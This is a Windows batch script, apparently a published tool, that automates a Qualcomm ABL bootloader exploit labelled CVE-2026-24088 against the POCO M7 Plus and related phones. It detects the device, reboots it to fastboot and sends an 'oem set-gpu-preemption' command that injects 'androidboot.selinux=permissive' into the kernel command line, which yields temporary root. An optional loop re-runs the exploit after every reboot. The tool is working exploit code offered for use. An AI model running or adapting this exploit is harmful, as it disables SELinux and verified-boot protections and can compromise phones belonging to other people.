@echo off
chcp 437 >nul 2>&1
title GBL Exploit v2.1 - CVE-2026-24088 ^| github.com/aniketlab
color 07
mode con: cols=75 lines=50

:: ?????? Permanent paths ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
set "SCRIPT_DIR=%~dp0"
if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
set "TOOLS_DIR=%SCRIPT_DIR%\platform-tools"
set "ADB_EXE=%TOOLS_DIR%\adb.exe"
set "FB_EXE=%TOOLS_DIR%\fastboot.exe"
set "TOOLS_URL=https://dl.google.com/android/repository/platform-tools-latest-windows.zip"
set "TOOLS_ZIP=%TEMP%\platform-tools.zip"
set "DRIVER_URL=https://dl.google.com/android/repository/usb_driver_r13-windows.zip"
set "TMPOUT=%TEMP%\gbl_out.txt"
set "VERSION=2.1"

:: ?????? Log file setup ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
for /f "tokens=1-3 delims=/ " %%a in ("%DATE%") do set "LOGDATE=%%c%%a%%b"
for /f "tokens=1-3 delims=:." %%a in ("%TIME: =0%") do set "LOGTIME=%%a%%b%%c"
set "LOGFILE=%SCRIPT_DIR%\log_%LOGDATE%_%LOGTIME%.txt"

:: ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
:main_start
setlocal EnableDelayedExpansion
set "ADB=adb"
set "FASTBOOT=fastboot"
set "MODEL=Unknown"
set "BRAND=Unknown"
set "BOARD=Unknown"
set "FAIL_REASON="
set "MODE="
set "LOOP_MODE=0"

call :banner
call :log_init
echo.
call :print_cyan "  Starting automated exploit sequence..."
echo.
timeout /t 1 /nobreak >nul


:: ============================================
:: STEP 1 - ADB CHECK + AUTO DOWNLOAD
:: ============================================
call :print_step "[1/6]" "Checking ADB / Platform Tools..."
echo.

call :find_or_download_adb
if errorlevel 1 goto :end_fail

echo.


:: ============================================
:: STEP 2 - FASTBOOT CHECK
:: ============================================
call :print_step "[2/6]" "Checking Fastboot..."
echo.

call :find_fastboot
if errorlevel 1 goto :end_fail

echo.


:: ============================================
:: STEP 3 - SMART DEVICE DETECTION & DRIVERS
:: ============================================
call :print_step "[3/6]" "Scanning for connected devices (ADB + Fastboot)..."
echo.

call :detect_any_device
if errorlevel 1 goto :end_fail

echo.


:: ============================================
:: STEP 4 - PRE-FLIGHT COMPATIBILITY CHECK
:: ============================================
call :print_step "[4/6]" "Running pre-flight compatibility check..."
echo.

call :preflight_check
echo.


:: ============================================
:: STEP 5 - REBOOT TO FASTBOOT (skip if already there)
:: ============================================
if "!MODE!"=="FASTBOOT" (
    call :print_step "[5/6]" "Device already in Fastboot mode ??? skipping reboot."
    echo.
    echo   ^> Proceeding directly to exploit.
    echo.
    call :log_write "[5/6] Device was already in Fastboot mode - skipped reboot."
) else (
    call :print_step "[5/6]" "Rebooting !MODEL! to fastboot mode..."
    "%ADB%" -s %DEVICE_SERIAL% reboot bootloader >nul 2>&1
    echo.
    call :log_write "[5/6] Sent ADB reboot bootloader command."
    call :wait_for_fastboot
    if errorlevel 1 goto :end_fail
)

echo.


:: ============================================
:: STEP 6 - EXPLOIT
:: ============================================
call :print_step "[6/6]" "Testing CVE-2026-24088..."
echo.
echo   Running:
echo     fastboot oem set-gpu-preemption 0
echo              androidboot.selinux=permissive
echo.
call :log_write "[6/6] Running exploit: fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive"

"%FASTBOOT%" oem set-gpu-preemption 0 androidboot.selinux=permissive > "%TMPOUT%" 2>&1

echo   Fastboot response:
echo   - - - - - - - - - - - - - - - - - - - - -
type "%TMPOUT%"
echo   - - - - - - - - - - - - - - - - - - - - -
echo.
call :log_write "--- Fastboot Response ---"
type "%TMPOUT%" >> "%LOGFILE%" 2>nul
call :log_write "--- End Response ---"

findstr /i "OKAY" "%TMPOUT%" >nul 2>&1
if %errorlevel% equ 0 goto :success

findstr /i "unknown command" "%TMPOUT%" >nul 2>&1
if %errorlevel% equ 0 (
    set "FAIL_REASON=Command unknown - device not a GBL-affected Qualcomm device"
    goto :not_supported
)

set "FAIL_REASON=Command rejected - firmware is patched or device not affected"
goto :not_supported


:: ============================================
:: SUCCESS
:: ============================================
:success
color 0A
cls
call :banner_success
echo.
echo   ====================================================
echo.
echo     RESULT: EXPLOIT SUCCESSFUL
echo.
echo     Device  : !MODEL!
echo     CVE     : CVE-2026-24088 VULNERABLE confirmed
echo     SELinux : now PERMISSIVE
echo     Mode    : !MODE!
echo.
echo   ====================================================
echo.
call :log_write "[RESULT] EXPLOIT SUCCESSFUL - SELinux set to PERMISSIVE"
call :log_write "[RESULT] Device: !MODEL! | Mode: !MODE!"

echo   [6/6] Continuing boot...
"%FASTBOOT%" continue >nul 2>&1
echo   [+] Device is booting now.
echo.
echo   --------------------------------------------------
echo    NEXT STEPS after phone fully boots:
echo   --------------------------------------------------
echo    1. Open KernelSU Manager OR ReSukiSU Manager
echo    2. Enable Jailbreak Mode
echo.
echo    Verify via ADB:
echo      adb shell getenforce    ??? Permissive
echo      adb shell su -c id      ??? uid=0(root)
echo.
echo    NOTE: Root is TEMPORARY. Run this script
echo    again after every reboot.
echo   --------------------------------------------------
echo.
echo    github.com/aniketlab/POCO-M7-Plus-Jailbreak
echo.
call :log_write "[INFO] fastboot continue sent. Device booting."
del "%TMPOUT%" >nul 2>&1

echo.
echo   --------------------------------------------------
echo    Log saved to:
echo    %LOGFILE%
echo   --------------------------------------------------
echo.
call :ask_loop_mode

echo.
echo   Press any key to exit...
pause >nul
goto :done


:: ============================================
:: NOT SUPPORTED / PATCHED
:: ============================================
:not_supported
color 0C
cls
echo.
echo   ====================================================
echo.
echo     RESULT: DEVICE NOT VULNERABLE / PATCHED
echo.
echo     Device  : !MODEL!
echo     SoC     : !BOARD!
echo     Reason  : !FAIL_REASON!
echo.
echo   ====================================================
echo.
echo   Raw fastboot response:
echo   - - - - - - - - - - - - -
type "%TMPOUT%" 2>nul
echo   - - - - - - - - - - - - -
echo.
echo   Possible reasons:
echo    - Firmware is already patched
echo      (HyperOS 3.0.304.0+ for POCO M7 Plus)
echo      (HyperOS 3.0.303.0+ for Redmi 15 5G)
echo    - Device model not affected by this ABL flaw
echo    - ABL updated via a security OTA
echo.
call :log_write "[RESULT] EXPLOIT FAILED - !FAIL_REASON!"

:: Recovery: reboot device back to normal
echo   [*] Recovering device ??? rebooting back to normal...
call :log_write "[RECOVERY] Sending fastboot reboot to recover device."
"%FASTBOOT%" reboot >nul 2>&1
echo   [+] Device rebooting.
del "%TMPOUT%" >nul 2>&1
echo.
echo   Log saved to: %LOGFILE%
echo.
echo   Press any key to see options...
pause >nul
goto :retry_prompt


:: ============================================
:: RETRY PROMPT
:: ============================================
:retry_prompt
color 07
echo.
echo   --------------------------------------------------
echo.
echo    What do you want to do?
echo.
echo    [R] Retry from beginning
echo    [C] Clean up (delete downloaded tools)
echo    [E] Exit
echo.
echo   --------------------------------------------------
choice /c RCE /n /m "   Your choice (R/C/E): "
echo.
if %errorlevel% equ 1 (
    endlocal
    goto :main_start
)
if %errorlevel% equ 2 goto :cleanup_action
goto :done


:: ============================================
:: END FAIL
:: ============================================
:end_fail
call :log_write "[FAIL] Script ended at setup step. Check above for reason."
echo.
echo   Log saved to: %LOGFILE%
echo.
echo   Press any key to see options...
pause >nul
goto :retry_prompt


:: ============================================
:: LOOP MODE - Ask user after success
:: ============================================
:ask_loop_mode
echo   --------------------------------------------------
echo    LOOP MODE ??? Automatically re-apply root after
echo    each reboot (keeps running in background)?
echo   --------------------------------------------------
choice /c YN /n /m "   Enable Loop Mode? (Y/N): "
if %errorlevel% equ 1 (
    set "LOOP_MODE=1"
    echo.
    call :print_cyan "   [LOOP] Waiting for device to reconnect..."
    call :log_write "[LOOP] Loop mode enabled. Waiting for next reboot cycle."
    echo.
    :: Wait for device to disappear (rebooting)
    :loop_wait_disconnect
    "%ADB%" devices 2>nul | findstr /r "[a-zA-Z0-9]" >nul 2>&1
    if !errorlevel! equ 0 (
        timeout /t 3 /nobreak >nul
        goto :loop_wait_disconnect
    )
    call :print_cyan "   [LOOP] Device rebooted. Waiting to reconnect..."
    endlocal
    goto :main_start
)
exit /b 0


:: ============================================
:: CLEANUP
:: ============================================
:cleanup_action
color 07
echo.
echo   --------------------------------------------------
echo    CLEANUP
echo   --------------------------------------------------
echo.
if exist "%TOOLS_DIR%" (
    echo   [*] Deleting: %TOOLS_DIR%
    rd /s /q "%TOOLS_DIR%" >nul 2>&1
    if exist "%TOOLS_DIR%" (
        echo   [X] Could not delete - close any programs using it.
    ) else (
        echo   [+] Deleted successfully.
    )
) else (
    echo   [i] platform-tools not found. Already clean.
)
echo.
if exist "%TOOLS_ZIP%" (
    echo   [*] Deleting leftover zip...
    del /f /q "%TOOLS_ZIP%" >nul 2>&1
    echo   [+] Zip deleted.
) else (
    echo   [i] No leftover zip. Already clean.
)
echo.
echo   Cleanup done. Next run will re-download tools.
echo.
choice /c RE /n /m "   (R) Retry  (E) Exit: "
if %errorlevel% equ 1 (
    endlocal
    goto :main_start
)
goto :done


:: ============================================
:: DONE
:: ============================================
:done
color 07
del "%TMPOUT%" >nul 2>&1
call :log_write "[SESSION END]"
endlocal
exit /b


:: ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
:: SUBROUTINES
:: ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????

:: ============================================
:: LOG INIT
:: ============================================
:log_init
echo ====================================================== > "%LOGFILE%"
echo  GBL-AutoRoot v%VERSION% Session Log >> "%LOGFILE%"
echo  Date: %DATE% %TIME% >> "%LOGFILE%"
echo ====================================================== >> "%LOGFILE%"
exit /b 0

:log_write
echo [%TIME%] %~1 >> "%LOGFILE%" 2>nul
exit /b 0


:: ============================================
:: SUB: FIND OR DOWNLOAD ADB
:: ============================================
:find_or_download_adb

:: 1. Check local folder first (offline mode)
if exist "%ADB_EXE%" (
    "%ADB_EXE%" version > "%TEMP%\adbver.txt" 2>&1
    for /f "tokens=*" %%v in ('findstr /i "version" "%TEMP%\adbver.txt"') do (
        call :print_green "   [+] Local ADB: %%v"
    )
    del "%TEMP%\adbver.txt" >nul 2>&1
    set "ADB=%ADB_EXE%"
    set "PATH=%TOOLS_DIR%;%PATH%"
    call :log_write "[ADB] Using local ADB: %ADB_EXE%"
    exit /b 0
)

:: 2. Check system PATH
adb version >nul 2>&1
if %errorlevel% equ 0 (
    adb version > "%TEMP%\adbver.txt" 2>&1
    for /f "tokens=*" %%v in ('findstr /i "version" "%TEMP%\adbver.txt"') do (
        call :print_green "   [+] System ADB: %%v"
    )
    del "%TEMP%\adbver.txt" >nul 2>&1
    set "ADB=adb"
    call :log_write "[ADB] Using system ADB from PATH."
    exit /b 0
)

:: 3. Download
call :print_yellow "   [-] ADB not found. Downloading from Google..."
echo.
echo   URL  : %TOOLS_URL%
echo.
call :log_write "[ADB] Not found locally or in PATH. Downloading..."

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ProgressPreference='SilentlyContinue';" ^
  "$url='%TOOLS_URL%';" ^
  "$out='%TOOLS_ZIP%';" ^
  "try {" ^
    "$req=[System.Net.HttpWebRequest]::Create($url);" ^
    "$req.UserAgent='Mozilla/5.0';" ^
    "$resp=$req.GetResponse();" ^
    "$total=$resp.ContentLength;" ^
    "$stream=$resp.GetResponseStream();" ^
    "$fs=[System.IO.File]::Create($out);" ^
    "$buf=New-Object byte[] 32768;" ^
    "$dl=0;" ^
    "$sw=[System.Diagnostics.Stopwatch]::StartNew();" ^
    "while(($r=$stream.Read($buf,0,$buf.Length))-gt 0){" ^
      "$fs.Write($buf,0,$r);$dl+=$r;" ^
      "$pct=[int](($dl/$total)*100);" ^
      "$dlMB=[math]::Round($dl/1MB,1);" ^
      "$totMB=[math]::Round($total/1MB,1);" ^
      "$spd=if($sw.Elapsed.TotalSeconds-gt 0){[math]::Round($dlMB/$sw.Elapsed.TotalSeconds,1)}else{0};" ^
      "$bar='#'*[int]($pct/4);" ^
      "$empty=' '*(25-[int]($pct/4));" ^
      "Write-Host('  [{0}{1}] {2,3}%% | {3} MB / {4} MB | {5} MB/s   '-f $bar,$empty,$pct,$dlMB,$totMB,$spd) -NoNewline;" ^
      "[Console]::SetCursorPosition(0,[Console]::CursorTop)" ^
    "};" ^
    "$fs.Close();$stream.Close();" ^
    "Write-Host ''" ^
  "} catch { Write-Host ''; Write-Host ('  [X] ' + $_.Exception.Message) }"

echo.

if not exist "%TOOLS_ZIP%" (
    call :print_red "   [X] Download failed. Check internet connection."
    call :log_write "[ADB] Download failed."
    exit /b 1
)

echo   [*] Extracting...
powershell -NoProfile -Command "Expand-Archive -Path '%TOOLS_ZIP%' -DestinationPath '%SCRIPT_DIR%' -Force" 2>nul
del "%TOOLS_ZIP%" >nul 2>&1

if not exist "%ADB_EXE%" (
    call :print_red "   [X] Extraction failed. adb.exe not found after extract."
    call :log_write "[ADB] Extraction failed."
    exit /b 1
)

set "ADB=%ADB_EXE%"
set "PATH=%TOOLS_DIR%;%PATH%"
call :print_green "   [+] Platform Tools downloaded and ready."
call :log_write "[ADB] Downloaded and extracted successfully."
exit /b 0


:: ============================================
:: SUB: FIND FASTBOOT
:: ============================================
:find_fastboot

if exist "%FB_EXE%" (
    "%FB_EXE%" --version > "%TEMP%\fbver.txt" 2>&1
    for /f "tokens=*" %%v in ('findstr /i "version" "%TEMP%\fbver.txt"') do (
        call :print_green "   [+] Local Fastboot: %%v"
    )
    del "%TEMP%\fbver.txt" >nul 2>&1
    set "FASTBOOT=%FB_EXE%"
    call :log_write "[FB] Using local Fastboot: %FB_EXE%"
    exit /b 0
)

fastboot --version >nul 2>&1
if %errorlevel% equ 0 (
    fastboot --version > "%TEMP%\fbver.txt" 2>&1
    for /f "tokens=*" %%v in ('findstr /i "version" "%TEMP%\fbver.txt"') do (
        call :print_green "   [+] System Fastboot: %%v"
    )
    del "%TEMP%\fbver.txt" >nul 2>&1
    set "FASTBOOT=fastboot"
    call :log_write "[FB] Using system Fastboot from PATH."
    exit /b 0
)

:: Missing fastboot ??? re-download
call :print_yellow "   [!] fastboot.exe missing. Fixing automatically..."
echo.
call :log_write "[FB] fastboot.exe missing. Re-downloading platform-tools."

if exist "%TOOLS_DIR%" rd /s /q "%TOOLS_DIR%" >nul 2>&1

echo   Downloading platform-tools from Google...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ProgressPreference='SilentlyContinue';" ^
  "$url='%TOOLS_URL%';" ^
  "$out='%TOOLS_ZIP%';" ^
  "try {" ^
    "$req=[System.Net.HttpWebRequest]::Create($url);" ^
    "$req.UserAgent='Mozilla/5.0';" ^
    "$resp=$req.GetResponse();" ^
    "$total=$resp.ContentLength;" ^
    "$stream=$resp.GetResponseStream();" ^
    "$fs=[System.IO.File]::Create($out);" ^
    "$buf=New-Object byte[] 32768;" ^
    "$dl=0;" ^
    "$sw=[System.Diagnostics.Stopwatch]::StartNew();" ^
    "while(($r=$stream.Read($buf,0,$buf.Length))-gt 0){" ^
      "$fs.Write($buf,0,$r);$dl+=$r;" ^
      "$pct=[int](($dl/$total)*100);" ^
      "$dlMB=[math]::Round($dl/1MB,1);" ^
      "$totMB=[math]::Round($total/1MB,1);" ^
      "$spd=if($sw.Elapsed.TotalSeconds-gt 0){[math]::Round($dlMB/$sw.Elapsed.TotalSeconds,1)}else{0};" ^
      "$bar='#'*[int]($pct/4);" ^
      "$empty=' '*(25-[int]($pct/4));" ^
      "Write-Host('  [{0}{1}] {2,3}%% | {3} MB / {4} MB | {5} MB/s   '-f $bar,$empty,$pct,$dlMB,$totMB,$spd) -NoNewline;" ^
      "[Console]::SetCursorPosition(0,[Console]::CursorTop)" ^
    "};" ^
    "$fs.Close();$stream.Close();" ^
    "Write-Host ''" ^
  "} catch { Write-Host ''; Write-Host ('  [X] ' + $_.Exception.Message) }"

if not exist "%TOOLS_ZIP%" (
    call :print_red "   [X] Download failed."
    call :log_write "[FB] Re-download failed."
    exit /b 1
)

powershell -NoProfile -Command "Expand-Archive -Path '%TOOLS_ZIP%' -DestinationPath '%SCRIPT_DIR%' -Force" 2>nul
del "%TOOLS_ZIP%" >nul 2>&1

if not exist "%FB_EXE%" (
    call :print_red "   [X] Still missing after re-download. Something went wrong."
    call :log_write "[FB] Still missing after re-download."
    exit /b 1
)

set "ADB=%ADB_EXE%"
set "FASTBOOT=%FB_EXE%"
set "PATH=%TOOLS_DIR%;%PATH%"
call :print_green "   [+] Fixed. Full platform-tools now available."
call :log_write "[FB] Fixed. Full platform-tools downloaded."
exit /b 0


:: ============================================
:: SUB: SMART DETECT - ADB or FASTBOOT & DRIVERS
:: ============================================
:detect_any_device
set "DEVICE_FOUND=0"
set "DEVICE_SERIAL="
set "FB_SERIAL="

:: 1. Quick check ADB
for /f "skip=1 tokens=1,2" %%a in ('"%ADB%" devices 2^>nul') do (
    if "%%b"=="device" (
        set "DEVICE_FOUND=1"
        set "DEVICE_SERIAL=%%a"
        set "MODE=ADB"
    )
    if "%%b"=="unauthorized" (
        call :print_yellow "   [!] Device is UNAUTHORIZED. Check your phone screen and tap 'Allow'."
        call :log_write "[DETECT] Device unauthorized."
    )
)
if "!DEVICE_FOUND!"=="1" goto :device_collect_info

:: 2. Quick check Fastboot
"%FASTBOOT%" devices 2>nul | findstr /r "[a-zA-Z0-9]" >nul 2>&1
if !errorlevel! equ 0 (
    for /f "tokens=1" %%i in ('"%FASTBOOT%" devices 2^>nul') do set "FB_SERIAL=%%i"
    if not "!FB_SERIAL!"=="" (
        set "DEVICE_FOUND=1"
        set "MODE=FASTBOOT"
        call :print_green "   [+] Device found in FASTBOOT mode: !FB_SERIAL!"
        call :log_write "[DETECT] Device found in FASTBOOT mode: !FB_SERIAL!"
        goto :device_collect_fastboot
    )
)

:: 3. Check for Missing Drivers (if no device found)
echo.
call :print_cyan "   [*] Checking for missing USB drivers..."
set "NEED_DRIVER=0"
powershell -NoProfile -Command "if (@(Get-WmiObject Win32_PnPEntity | Where-Object { ($_.ConfigManagerErrorCode -ne 0 -or $_.Name -match 'Unknown' -or $_.Name -match 'Android' -or $_.Name -match 'ADB') -and $_.DeviceID -match 'USB' }).Count -gt 0) { exit 1 } else { exit 0 }"
if !errorlevel! equ 1 set "NEED_DRIVER=1"

if "!NEED_DRIVER!"=="1" (
    call :print_yellow "   [!] Found connected USB device with missing or generic drivers."
    choice /c YN /n /m "   Auto-install Official Google USB Drivers now? (Y/N): "
    if !errorlevel! equ 1 (
        call :install_usb_drivers
        :: After install, restart the detection loop to catch the newly detected device
        goto :detect_any_device
    )
)

:: Nothing found ??? wait loop
echo.
call :print_yellow "   [-] No device detected yet."
echo.
echo    Connect your phone via USB. Script auto-detects:
echo      - Normal mode (ADB / USB Debugging ON)
echo      - Fastboot mode (already in bootloader)
echo.
echo    Waiting up to 60 seconds...
<nul set /p ="   "

set "WAIT=0"
:detect_loop
if !WAIT! geq 30 goto :detect_timeout
timeout /t 2 /nobreak >nul
set /a WAIT+=1
<nul set /p ="."

:: Check ADB
set "DEVICE_FOUND=0"
for /f "skip=1 tokens=1,2" %%a in ('"%ADB%" devices 2^>nul') do (
    if "%%b"=="device" (
        set "DEVICE_FOUND=1"
        set "DEVICE_SERIAL=%%a"
        set "MODE=ADB"
    )
)
if "!DEVICE_FOUND!"=="1" (
    echo.
    call :print_green "   [+] ADB Device connected!"
    call :log_write "[DETECT] ADB Device connected: !DEVICE_SERIAL!"
    goto :device_collect_info
)

:: Check Fastboot
"%FASTBOOT%" devices 2>nul | findstr /r "[a-zA-Z0-9]" >nul 2>&1
if !errorlevel! equ 0 (
    for /f "tokens=1" %%i in ('"%FASTBOOT%" devices 2^>nul') do set "FB_SERIAL=%%i"
    if not "!FB_SERIAL!"=="" (
        set "DEVICE_FOUND=1"
        set "MODE=FASTBOOT"
        echo.
        call :print_green "   [+] Fastboot Device detected!"
        call :log_write "[DETECT] Fastboot Device connected: !FB_SERIAL!"
        goto :device_collect_fastboot
    )
)
goto :detect_loop

:detect_timeout
echo.
echo.
call :print_red "   [X] No device detected after 60 seconds."
call :log_write "[DETECT] Timeout - no device found."
exit /b 1


:: ============================================
:: SUB: INSTALL USB DRIVERS (AUTO)
:: ============================================
:install_usb_drivers
echo.
call :print_cyan "   [+] Downloading Official Google USB Drivers..."
call :log_write "[DRIVER] Downloading Google USB Drivers..."
set "DRV_ZIP=%TEMP%\usb_driver.zip"
set "DRV_DIR=%TEMP%\usb_driver_extracted"

:: Download Driver Zip
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$url='%DRIVER_URL%'; $out='%DRV_ZIP%'; " ^
  "try { Invoke-WebRequest -Uri $url -OutFile $out } catch { exit 1 }"
if !errorlevel! neq 0 (
    call :print_red "   [X] Driver download failed. Check internet."
    call :log_write "[DRIVER] Download failed."
    exit /b
)

call :print_cyan "   [+] Extracting drivers..."
if exist "%DRV_DIR%" rd /s /q "%DRV_DIR%"
powershell -NoProfile -Command "Expand-Archive -Path '%DRV_ZIP%' -DestinationPath '%DRV_DIR%' -Force"

echo.
call :print_yellow "   [*] A Windows UAC popup will appear to install the driver."
call :print_yellow "   [*] Please click 'Yes' to allow the installation."
timeout /t 2 /nobreak >nul

:: Execute pnputil via PowerShell RunAs to trigger UAC
powershell -NoProfile -Command "Start-Process cmd -ArgumentList '/c pnputil /add-driver \"%DRV_DIR%\usb_driver\android_winusb.inf\" /install' -Verb RunAs -WindowStyle Hidden -Wait"

call :print_green "   [+] Driver installation complete."
call :log_write "[DRIVER] Installation command finished."

:: Cleanup
del "%DRV_ZIP%" >nul 2>&1
rd /s /q "%DRV_DIR%" >nul 2>&1

echo.
call :print_cyan "   [*] Restarting device scan..."
timeout /t 2 /nobreak >nul
exit /b 0


:: ---- Collect info via ADB ----
:device_collect_info
echo.
call :print_cyan "   [*] Reading device info via ADB..."
echo.
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.product.brand 2^>nul') do set "BRAND=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.product.model 2^>nul') do set "MODEL=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.build.version.release 2^>nul') do set "ANDROID=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.build.version.security_patch 2^>nul') do set "PATCH=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.product.board 2^>nul') do set "BOARD=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.boot.verifiedbootstate 2^>nul') do set "BOOTSTATE=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.build.display.id 2^>nul') do set "FIRMWARE=%%i"
goto :show_device_info

:: ---- Collect info via Fastboot ----
:device_collect_fastboot
echo.
call :print_cyan "   [*] Reading device info via Fastboot..."
echo.
for /f "tokens=2 delims=: " %%i in ('"%FASTBOOT%" getvar product 2^>^&1 ^| findstr /i "product"') do set "MODEL=%%i"
for /f "tokens=2 delims=: " %%i in ('"%FASTBOOT%" getvar version-baseband 2^>^&1 ^| findstr /i "version"') do set "FIRMWARE=%%i"
set "BRAND=Xiaomi/POCO"
set "ANDROID=Unknown (Fastboot)"
set "PATCH=Unknown (Fastboot)"
set "BOOTSTATE=Fastboot Mode"

:show_device_info
echo   ====================================================
echo    Device Info
echo   ====================================================
echo    Brand         : !BRAND!
echo    Model         : !MODEL!
echo    Android       : !ANDROID!
echo    Security Patch: !PATCH!
echo    Board / SoC   : !BOARD!
echo    Boot State    : !BOOTSTATE!
echo    Firmware      : !FIRMWARE!
echo    Detection Mode: !MODE!
echo   ====================================================
echo.
call :log_write "[DEVICE] Brand=!BRAND! Model=!MODEL! Android=!ANDROID! Patch=!PATCH! Board=!BOARD! Mode=!MODE! Firmware=!FIRMWARE!"
exit /b 0


:: ============================================
:: SUB: PRE-FLIGHT COMPATIBILITY CHECK
:: ============================================
:preflight_check
set "COMPAT_STATUS=PASS"
set "COMPAT_WARN="

echo   ====================================================
echo    Pre-Flight Check
echo   ====================================================

:: Check 1: Is it a Qualcomm device?
echo !BOARD! | findstr /i "SM6375 SM7675 SM8550 SM8650 SM7550 SM6450 SM6115 SM6225 SM8475 SM8350" >nul 2>&1
if !errorlevel! equ 0 (
    call :print_green "   [PASS] Qualcomm SoC detected: !BOARD!"
    call :log_write "[PREFLIGHT] Qualcomm SoC confirmed: !BOARD!"
) else (
    if "!BOARD!"=="Unknown" (
        call :print_yellow "   [WARN] SoC unknown (Fastboot mode). Proceeding anyway."
        call :log_write "[PREFLIGHT] WARN: SoC unknown."
        set "COMPAT_WARN=SoC unverified"
    ) else (
        call :print_yellow "   [WARN] SoC '!BOARD!' not in tested list. May not work."
        call :log_write "[PREFLIGHT] WARN: Untested SoC: !BOARD!"
        set "COMPAT_WARN=Untested SoC"
    )
)

:: Check 2: Bootloader state
if "!BOOTSTATE!"=="orange" (
    call :print_yellow "   [WARN] Bootloader is UNLOCKED (orange state)."
    call :log_write "[PREFLIGHT] Bootloader already unlocked."
) else if "!BOOTSTATE!"=="green" (
    call :print_green "   [PASS] Bootloader is locked ??? ABL injection target confirmed."
    call :log_write "[PREFLIGHT] Bootloader locked (green)."
) else (
    call :print_yellow "   [INFO] Boot state: !BOOTSTATE!"
    call :log_write "[PREFLIGHT] Boot state: !BOOTSTATE!"
)

:: Check 3: Known patched firmware warning
if not "!FIRMWARE!"=="" (
    echo !FIRMWARE! | findstr /i "3.0.304\|3.0.305\|3.0.306\|3.0.307\|3.0.308\|3.0.309\|3.0.310" >nul 2>&1
    if !errorlevel! equ 0 (
        call :print_red "   [WARN] Firmware version may be PATCHED (HyperOS 3.0.304+)."
        call :print_red "         This exploit may not work on this firmware."
        call :log_write "[PREFLIGHT] WARN: Likely patched firmware: !FIRMWARE!"
        set "COMPAT_WARN=Firmware may be patched"
    ) else (
        call :print_green "   [PASS] Firmware version looks exploitable: !FIRMWARE!"
        call :log_write "[PREFLIGHT] Firmware version OK: !FIRMWARE!"
    )
)

echo.
if not "!COMPAT_WARN!"=="" (
    call :print_yellow "   [!] Warning: !COMPAT_WARN! ??? Continue at your own risk."
    echo.
    choice /c YN /n /m "   Proceed anyway? (Y/N): "
    if !errorlevel! equ 2 (
        call :log_write "[PREFLIGHT] User chose to abort due to warning."
        goto :done
    )
    call :log_write "[PREFLIGHT] User chose to proceed despite warning."
) else (
    call :print_green "   [ALL PASS] Device looks compatible."
    call :log_write "[PREFLIGHT] All checks passed."
)
echo   ====================================================
exit /b 0


:: ============================================
:: SUB: WAIT FOR FASTBOOT DEVICE
:: ============================================
:wait_for_fastboot
set "FB_READY=0"
<nul set /p ="   Detecting "

set "FBWAIT=0"
:fb_loop
if !FBWAIT! geq 30 goto :fb_timeout
timeout /t 1 /nobreak >nul
set /a FBWAIT+=1
<nul set /p ="."

"%FASTBOOT%" devices 2>nul | findstr /r "[a-zA-Z0-9]" >nul 2>&1
if !errorlevel! equ 0 (
    set "FB_READY=1"
    goto :fb_found
)
goto :fb_loop

:fb_timeout
echo.
echo.
call :print_red "   [X] Device did not enter fastboot within 30 seconds."
call :log_write "[FASTBOOT] Timeout waiting for fastboot mode."
exit /b 1

:fb_found
echo.
echo.
for /f "tokens=1" %%i in ('"%FASTBOOT%" devices 2^>nul') do set "FB_SERIAL=%%i"
call :print_green "   [+] Fastboot ready. Serial: !FB_SERIAL!"
call :log_write "[FASTBOOT] Ready. Serial: !FB_SERIAL!"
exit /b 0


:: ============================================
:: COLOR PRINT HELPERS
:: ============================================
:print_green
color 0A
echo %~1
color 07
exit /b 0

:print_red
color 0C
echo %~1
color 07
exit /b 0

:print_yellow
color 0E
echo %~1
color 07
exit /b 0

:print_cyan
color 0B
echo %~1
color 07
exit /b 0

:print_step
color 0B
echo   %~1 %~2
color 07
exit /b 0


:: ============================================
:: BANNERS
:: ============================================
:banner
cls
color 0A
echo.
echo   ====================================================
echo    Qualcomm GBL Exploit v%VERSION%  -  CVE-2026-24088
echo    Automated Root via ABL Cmdline Injection
echo   ----------------------------------------------------
echo    Tested     : POCO M7 Plus 5G (SM6375)
echo    Compatible : Qualcomm ABL vulnerable devices
echo    Author     : github.com/aniketlab
echo    Disclaimer : Educational / Research Use Only
echo   ====================================================
color 07
goto :eof

:banner_success
color 0A
echo.
echo   ====================================================
echo    CVE-2026-24088  |  EXPLOIT RESULT
echo    github.com/aniketlab/POCO-M7-Plus-Jailbreak
echo   ====================================================
color 07
goto :eof
